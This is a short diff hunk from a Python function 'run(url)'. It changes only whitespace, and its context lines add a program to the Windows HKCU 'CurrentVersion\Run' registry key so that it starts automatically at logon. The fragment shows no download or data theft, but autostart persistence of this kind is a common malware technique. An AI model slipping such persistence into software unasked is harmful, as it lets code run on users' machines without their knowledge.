@@ -80,11 +80,9 @@ def run(url):
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
         winreg.CloseKey(key)
-    
-    
+     
     
     os_type = platform.system()
-    
     
     if os_type == 'Windows':
         import winreg
